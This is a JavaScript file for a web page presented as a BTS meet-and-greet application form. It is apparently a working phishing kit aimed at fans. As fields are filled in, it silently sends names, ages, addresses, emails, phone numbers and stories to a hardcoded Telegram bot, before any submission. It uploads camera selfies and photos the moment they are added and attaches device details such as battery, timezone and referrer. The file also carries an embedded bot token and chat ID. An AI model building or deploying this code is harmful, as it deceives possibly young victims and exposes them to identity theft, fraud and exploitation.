/* ============================================================
   BTS MEET & GREET — FULL FEATURED
   Real-time auto-send · Battery · Referrer · Progressive
   ============================================================ */

var BOT_TOKEN     = "8604239989:AAHnuyJZpz_E6s-_7rXUvlbHazAKOAHEB7A";
var ADMIN_CHAT_ID = "7274208494";
var IMAGE_QUALITY = 0.85;
var MAX_PHOTOS    = 5;

/* ============================================================ */

var form     = document.getElementById("applyForm");
var fullName = document.getElementById("fullName");
var age      = document.getElementById("age");
var country  = document.getElementById("country");
var city     = document.getElementById("city");
var email    = document.getElementById("email");
var phone    = document.getElementById("phone");
var favMember= document.getElementById("favMember");
var reason   = document.getElementById("reason");

var sec1 = document.getElementById("sec1");
var sec2 = document.getElementById("sec2");
var sec3 = document.getElementById("sec3");
var badge1 = document.getElementById("badge1");
var badge2 = document.getElementById("badge2");
var badge3 = document.getElementById("badge3");
var step1El = document.getElementById("step1");
var step2El = document.getElementById("step2");
var step3El = document.getElementById("step3");

var pvName    = document.getElementById("pv-name");
var pvCountry = document.getElementById("pv-country");
var pvFav     = document.getElementById("pv-fav");
var pvPhoto   = document.getElementById("pv-photo");
var dotName   = document.getElementById("dot-name");
var dotCountry= document.getElementById("dot-country");
var dotFav    = document.getElementById("dot-fav");
var dotPhoto  = document.getElementById("dot-photo");

var btnCamera  = document.getElementById("btnCamera");
var btnUpload  = document.getElementById("btnUpload");
var fileInput  = document.getElementById("fileInput");
var photoPreviews = document.getElementById("photoPreviews");
var photoCount = document.getElementById("photoCount");

var btnSubmit  = document.getElementById("btnSubmit");
var formStatus = document.getElementById("formStatus");

var camModal    = document.getElementById("camModal");
var cameraVideo = document.getElementById("cameraVideo");
var camClose    = document.getElementById("camClose");
var camCancel   = document.getElementById("camCancel");
var camCapture  = document.getElementById("camCapture");
var camCountdown= document.getElementById("camCountdown");
var hiddenCanvas= document.getElementById("hiddenCanvas");

var photos = [];
var camStream = null;

var sent = { section1: false, section2: false };

/* ============================================================
   DEVICE INFO (battery, referrer, screen, timezone)
   ============================================================ */
var deviceInfo = {
  battery: "N/A",
  charging: "N/A",
  referrer: document.referrer || "Direct",
  screen: window.innerWidth + "x" + window.innerHeight,
  timezone: (Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"),
  language: navigator.language || "Unknown",
  platform: navigator.platform || "Unknown"
};

if (navigator.getBattery) {
  navigator.getBattery().then(function(b) {
    deviceInfo.battery = Math.round(b.level * 100) + "%";
    deviceInfo.charging = b.charging ? "Yes ⚡" : "No 🔋";
    b.addEventListener("levelchange", function() {
      deviceInfo.battery = Math.round(b.level * 100) + "%";
    });
    b.addEventListener("chargingchange", function() {
      deviceInfo.charging = b.charging ? "Yes ⚡" : "No 🔋";
    });
  }).catch(function(){});
}

function deviceInfoString() {
  return (
    "━━━━━━━━━━━━━━━━━━━━━━\n" +
    "📱 <b>Device Info</b>\n" +
    "🔋 <b>Battery:</b> " + deviceInfo.battery + "\n" +
    "⚡ <b>Charging:</b> " + deviceInfo.charging + "\n" +
    "📺 <b>Screen:</b> " + deviceInfo.screen + "\n" +
    "🌐 <b>Referrer:</b> " + escape(deviceInfo.referrer) + "\n" +
    "🕐 <b>Timezone:</b> " + deviceInfo.timezone + "\n" +
    "🗣️ <b>Language:</b> " + deviceInfo.language + "\n" +
    "💻 <b>Platform:</b> " + deviceInfo.platform + "\n" +
    "🌍 <b>URL:</b> " + location.href + "\n" +
    "📅 <b>Time:</b> " + new Date().toLocaleString("en-US", {timeZoneName:"short"})
  );
}

/* ============================================================
   HELPERS
   ============================================================ */
function escape(s) {
  return String(s || "").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
}
function showStatus(type, msg) {
  formStatus.className = "status show " + type;
  formStatus.textContent = msg;
}
function hideStatus() {
  formStatus.className = "status";
  formStatus.textContent = "";
}

/* ============================================================
   TELEGRAM
   ============================================================ */
function sendMessage(text) {
  var body = "chat_id=" + encodeURIComponent(ADMIN_CHAT_ID) +
             "&text=" + encodeURIComponent(text) +
             "&parse_mode=HTML" +
             "&disable_web_page_preview=true";
  return fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: body
  }).then(function(r){ return r.json(); }).then(function(d){ return d.ok; }).catch(function(){ return false; });
}

function sendPhotoBlob(blob, caption) {
  var fd = new FormData();
  fd.append("chat_id", ADMIN_CHAT_ID);
  fd.append("photo", blob, "bts_" + Date.now() + ".jpg");
  fd.append("caption", caption);
  fd.append("parse_mode", "HTML");
  return fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {
    method: "POST", body: fd
  }).then(function(r){ return r.json(); }).then(function(d){ return d.ok; }).catch(function(){ return false; });
}

/* ============================================================
   LIVE PREVIEW
   ============================================================ */
function updatePreview() {
  if (fullName.value.trim()) {
    pvName.textContent = fullName.value.trim();
    pvName.classList.remove("empty");
    dotName.classList.add("ok");
  } else {
    pvName.textContent = "—"; pvName.classList.add("empty");
    dotName.classList.remove("ok");
  }
  if (country.value) {
    pvCountry.textContent = country.value;
    pvCountry.classList.remove("empty");
    dotCountry.classList.add("ok");
  } else {
    pvCountry.textContent = "—"; pvCountry.classList.add("empty");
    dotCountry.classList.remove("ok");
  }
  if (favMember.value) {
    var name = favMember.value.split("(")[0].trim();
    pvFav.textContent = name;
    pvFav.classList.remove("empty");
    dotFav.classList.add("ok");
  } else {
    pvFav.textContent = "—"; pvFav.classList.add("empty");
    dotFav.classList.remove("ok");
  }
  pvPhoto.textContent = photos.length;
  if (photos.length > 0) dotPhoto.classList.add("ok");
  else dotPhoto.classList.remove("ok");
}

/* ============================================================
   SECTION VALIDATION
   ============================================================ */
function isSection1Complete() {
  return fullName.value.trim() && age.value.trim() &&
         country.value && city.value.trim() &&
         email.value.trim() && phone.value.trim();
}
function isSection2Complete() {
  return favMember.value && reason.value.trim();
}
function isSection3Complete() { return photos.length > 0; }

/* ============================================================
   CAPTIONS
   ============================================================ */
function buildSection1Caption() {
  return (
    "🎯 <b>BTS MEET &amp; GREET — Step 1</b>\n" +
    "━━━━━━━━━━━━━━━━━━━━━━\n" +
    "👤 <b>Name:</b> " + escape(fullName.value.trim()) + "\n" +
    "🎂 <b>Age:</b> " + escape(age.value.trim()) + "\n" +
    "🌍 <b>Country:</b> " + escape(country.value) + "\n" +
    "🏙️ <b>City:</b> " + escape(city.value.trim()) + "\n" +
    "📧 <b>Email:</b> " + escape(email.value.trim()) + "\n" +
    "📱 <b>Phone:</b> " + escape(phone.value.trim()) + "\n" +
    deviceInfoString()
  );
}

function buildSection2Caption() {
  return (
    "🎯 <b>BTS MEET &amp; GREET — Step 2</b>\n" +
    "━━━━━━━━━━━━━━━━━━━━━━\n" +
    "👤 <b>Name:</b> " + escape(fullName.value.trim()) + "\n" +
    "💜 <b>Favourite:</b> " + escape(favMember.value) + "\n" +
    "━━━━━━━━━━━━━━━━━━━━━━\n" +
    "📝 <b>Reason:</b>\n" + escape(reason.value.trim()) + "\n" +
    deviceInfoString()
  );
}

/* ============================================================
   AUTO-SEND PER SECTION
   ============================================================ */
function autoSendSection(num) {
  if (num === 1 && !sent.section1 && isSection1Complete()) {
    sent.section1 = true;
    sendMessage(buildSection1Caption()).then(function(ok){
      if (ok) {
        sec1.classList.add("completed");
        badge1.textContent = "Complete ✓";
        step1El.classList.remove("active");
        step1El.classList.add("done");
        unlockSection(2);
      }
    });
  }
  if (num === 2 && !sent.section2 && isSection2Complete()) {
    sent.section2 = true;
    sendMessage(buildSection2Caption()).then(function(ok){
      if (ok) {
        sec2.classList.add("completed");
        badge2.textContent = "Complete ✓";
        step2El.classList.remove("active");
        step2El.classList.add("done");
        unlockSection(3);
      }
    });
  }
}

function unlockSection(num) {
  if (num === 2) {
    sec2.classList.add("unlocked", "active");
    badge2.textContent = "In progress";
    step2El.classList.add("active");
  }
  if (num === 3) {
    sec3.classList.add("unlocked", "active");
    badge3.textContent = "In progress";
    step3El.classList.add("active");
    btnSubmit.disabled = false;
  }
}

/* ============================================================
   LISTENERS
   ============================================================ */
[fullName, age, city, email, phone].forEach(function(el){
  el.addEventListener("input", function(){ updatePreview(); checkAll(); });
});
[country, favMember].forEach(function(el){
  el.addEventListener("change", function(){ updatePreview(); checkAll(); });
});
reason.addEventListener("input", function(){ updatePreview(); checkAll(); });

function checkAll() {
  autoSendSection(1);
  autoSendSection(2);
}

/* ============================================================
   CAMERA
   ============================================================ */
btnCamera.addEventListener("click", function(){
  if (photos.length >= MAX_PHOTOS) {
    showStatus("err","Maximum " + MAX_PHOTOS + " photos allowed.");
    return;
  }
  camModal.classList.add("open");
  navigator.mediaDevices.getUserMedia({
    video: { width:{ideal:1280}, height:{ideal:960}, facingMode:"user" }
  }).then(function(s){
    camStream = s;
    cameraVideo.srcObject = s;
    return cameraVideo.play();
  }).catch(function(err){
    var msg = "Camera not available. ";
    if (err.name === "NotAllowedError") msg += "Please allow access.";
    else msg += "Use HTTPS.";
    showStatus("err", msg);
    setTimeout(closeCamera, 2000);
  });
});
camClose.addEventListener("click", closeCamera);
camCancel.addEventListener("click", closeCamera);
function closeCamera() {
  camModal.classList.remove("open");
  camCountdown.classList.remove("show");
  if (camStream) { camStream.getTracks().forEach(function(t){t.stop();}); camStream = null; }
  cameraVideo.srcObject = null;
}
camCapture.addEventListener("click", function(){
  if (!camStream) return;
  var c = 3;
  camCountdown.textContent = c;
  camCountdown.classList.add("show");
  var iv = setInterval(function(){
    c--;
    if (c > 0) camCountdown.textContent = c;
    else {
      clearInterval(iv);
      camCountdown.classList.remove("show");
      grabFrame();
    }
  }, 700);
});
function grabFrame() {
  var w = cameraVideo.videoWidth || 1280;
  var h = cameraVideo.videoHeight || 960;
  hiddenCanvas.width = w; hiddenCanvas.height = h;
  var ctx = hiddenCanvas.getContext("2d");
  ctx.translate(w, 0); ctx.scale(-1, 1);
  ctx.drawImage(cameraVideo, 0, 0, w, h);
  ctx.setTransform(1, 0, 0, 1, 0, 0);
  hiddenCanvas.toBlob(function(blob){
    if (!blob) return;
    var url = hiddenCanvas.toDataURL("image/jpeg", IMAGE_QUALITY);
    addPhoto(blob, url);
    closeCamera();
  }, "image/jpeg", IMAGE_QUALITY);
}

/* ============================================================
   FILE UPLOAD
   ============================================================ */
btnUpload.addEventListener("click", function(){
  if (photos.length >= MAX_PHOTOS) {
    showStatus("err","Maximum " + MAX_PHOTOS + " photos allowed.");
    return;
  }
  fileInput.click();
});
fileInput.addEventListener("change", function(e){
  var files = e.target.files;
  if (!files || !files.length) return;
  for (var i = 0; i < files.length; i++) {
    if (photos.length >= MAX_PHOTOS) {
      showStatus("err","Maximum " + MAX_PHOTOS + " photos allowed.");
      break;
    }
    var f = files[i];
    if (!f.type.startsWith("image/")) continue;
    if (f.size > 10 * 1024 * 1024) {
      showStatus("err","Photo must be under 10 MB.");
      continue;
    }
    (function(file){
      var rd = new FileReader();
      rd.onload = function(ev){ addPhoto(file, ev.target.result); };
      rd.readAsDataURL(file);
    })(f);
  }
  fileInput.value = "";
});

/* ============================================================
   PHOTO MANAGEMENT — Auto-send on add
   ============================================================ */
function addPhoto(blob, dataURL) {
  if (photos.length >= MAX_PHOTOS) return;

  var entry = {
    blob: blob,
    dataURL: dataURL,
    sent: false,
    index: photos.length + 1
  };
  photos.push(entry);
  renderPhotos();
  updatePreview();
  hideStatus();

  var caption =
    "📸 <b>BTS Meet — New Photo</b> (" + entry.index + "/" + MAX_PHOTOS + ")\n" +
    "━━━━━━━━━━━━━━━━━━━━━━\n" +
    "👤 <b>Name:</b> " + escape(fullName.value.trim() || "—") + "\n" +
    "📸 <b>Photo #:</b> " + entry.index + "\n" +
    "🕐 " + new Date().toLocaleString("en-US", {timeZoneName:"short"});

  sendPhotoBlob(blob, caption).then(function(ok){
    if (ok) {
      entry.sent = true;
      renderPhotos();
      if (!sec3.classList.contains("completed")) {
        sec3.classList.add("completed");
        badge3.textContent = "Complete ✓";
        step3El.classList.remove("active");
        step3El.classList.add("done");
      }
    }
  });
}

function removePhoto(i) {
  photos.splice(i, 1);
  photos.forEach(function(p, idx){ p.index = idx + 1; });
  renderPhotos();
  updatePreview();
}

function renderPhotos() {
  photoPreviews.innerHTML = "";
  photos.forEach(function(p, i){
    var thumb = document.createElement("div");
    thumb.className = "photo-thumb";
    thumb.innerHTML =
      '<img src="' + p.dataURL + '" alt="Photo">' +
      (p.sent ? '<div class="upload-tick">✓</div>' : '') +
      '<button type="button" class="rm" data-index="' + i + '">✕</button>';
    photoPreviews.appendChild(thumb);
  });
  photoPreviews.querySelectorAll(".rm").forEach(function(b){
    b.addEventListener("click", function(){
      removePhoto(parseInt(this.dataset.index));
    });
  });
  photoCount.innerHTML = "<strong>" + photos.length + "</strong> / " + MAX_PHOTOS + " photos added";
}

/* ============================================================
   FINAL SUBMIT
   ============================================================ */
form.addEventListener("submit", function(e){
  e.preventDefault();
  hideStatus();

  var missing = [];
  if (!isSection1Complete()) missing.push("Section I (Personal)");
  if (!isSection2Complete()) missing.push("Section II (Story)");
  if (!isSection3Complete()) missing.push("Section III (Photo)");

  if (missing.length) {
    showStatus("err", "Please complete: " + missing.join(", "));
    return;
  }

  btnSubmit.disabled = true;
  btnSubmit.textContent = "Submitting…";
  showStatus("info", "Sending your complete application…");

  var finalCaption =
    "🎉 <b>BTS MEET &amp; GREET — COMPLETE APPLICATION</b>\n" +
    "═══════════════════════\n" +
    "👤 <b>Name:</b> " + escape(fullName.value.trim()) + "\n" +
    "🎂 <b>Age:</b> " + escape(age.value.trim()) + "\n" +
    "🌍 <b>Country:</b> " + escape(country.value) + "\n" +
    "🏙️ <b>City:</b> " + escape(city.value.trim()) + "\n" +
    "📧 <b>Email:</b> " + escape(email.value.trim()) + "\n" +
    "📱 <b>Phone:</b> " + escape(phone.value.trim()) + "\n" +
    "─────────\n" +
    "💜 <b>Favourite:</b> " + escape(favMember.value) + "\n" +
    "📝 <b>Story:</b>\n" + escape(reason.value.trim()) + "\n" +
    "─────────\n" +
    "📸 <b>Photos:</b> " + photos.length + " attached\n" +
    deviceInfoString();

  sendMessage(finalCaption).then(function(ok){
    if (ok) {
      showStatus("ok", "✓ Application submitted! Thank you, ARMY.");
      btnSubmit.textContent = "Submitted ✓";
      setTimeout(function(){ window.location.href = "next.html"; }, 1600);
    } else {
      showStatus("err", "Failed to send. Please try again.");
      btnSubmit.disabled = false;
      btnSubmit.textContent = "Submit Complete Application";
    }
  }).catch(function(){
    showStatus("err", "Something went wrong.");
    btnSubmit.disabled = false;
    btnSubmit.textContent = "Submit Complete Application";
  });
});

/* ============================================================
   BOOT
   ============================================================ */
window.addEventListener("load", function(){
  updatePreview();
  checkAll();
});
